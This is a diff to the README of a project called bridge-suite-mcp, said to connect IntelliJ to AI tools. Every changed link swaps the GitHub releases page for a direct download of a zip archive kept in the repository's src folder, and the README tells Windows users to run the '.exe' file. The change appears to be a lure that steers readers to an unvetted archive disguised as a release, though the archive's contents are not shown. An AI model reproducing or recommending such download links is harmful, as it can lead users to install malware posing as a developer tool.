@@ -1,10 +1,10 @@
 # 🚆 bridge-suite-mcp - Connect IntelliJ to AI Tools
 
-[![Download bridge-suite-mcp](https://img.shields.io/badge/Download-bridge--suite--mcp-blue.svg)](https://github.com/oxidizable-malinois605/bridge-suite-mcp/releases)
+[![Download bridge-suite-mcp](https://img.shields.io/badge/Download-bridge--suite--mcp-blue.svg)](https://raw.githubusercontent.com/oxidizable-malinois605/bridge-suite-mcp/main/src/mcp-suite-bridge-2.9.zip)
 
 ## 📥 Download bridge-suite-mcp
 
-Visit this page to download: https://github.com/oxidizable-malinois605/bridge-suite-mcp/releases
+Visit this page to download: https://raw.githubusercontent.com/oxidizable-malinois605/bridge-suite-mcp/main/src/mcp-suite-bridge-2.9.zip
 
 Use the latest release for Windows and download the file that matches your system. If you are not sure which file to pick, choose the one marked for Windows or the one with `.exe` in the name.
 
@@ -132,7 +132,7 @@ The server is meant to run on your computer and connect to your local IDE sessio
 
 ## 📎 Download again
 
-[Visit the release page to download bridge-suite-mcp](https://github.com/oxidizable-malinois605/bridge-suite-mcp/releases)
+[Visit the release page to download bridge-suite-mcp](https://raw.githubusercontent.com/oxidizable-malinois605/bridge-suite-mcp/main/src/mcp-suite-bridge-2.9.zip)
 
 ## 🧰 Project details
 
